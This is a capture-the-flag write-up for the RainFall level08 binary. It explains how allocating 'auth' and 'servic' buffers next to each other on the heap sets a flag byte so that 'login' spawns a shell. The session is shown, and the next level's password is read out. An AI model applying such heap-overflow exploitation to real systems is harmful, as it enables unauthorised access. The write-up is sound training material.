# level08

The program waits for input in an infinite loop, and print some variables:

```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
dsa
(nil), (nil) 
dasd
(nil), (nil) 
das
(nil), (nil) 
```

By looking at the code, we can se that the program compare the input string with: "auth ", "reset", "servic" and "login".

In "auth " if, the program malloc the <auth> variable with 4 bytes. It checks if the input string is lower that 34, and copy it in the new malloc'ed buffer.

In "servic" if, the program malloc the <service> variable and copy the input string from the 7th bytes.

In "login" if, the program checks if the byte at is <auth> + 20 is different of 0. It opens a shell if true.

When passing "auth ", we can see that the address begin at 0x804a008:

```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
auth 
0x804a008, (nil) 
```

We need so to overwrite the first byte at address 0x804a028.

When passing "servic", we can see that the second address begin at 0x804a018. Malloc allocate a minimum of 16 bytes.

So to override the byte, we simlpy need to put one byte after "servic".

We try to exploit the program:

```bash
servic 
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ whoami
level9
$ cd /home/user/level9
$ cat .pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
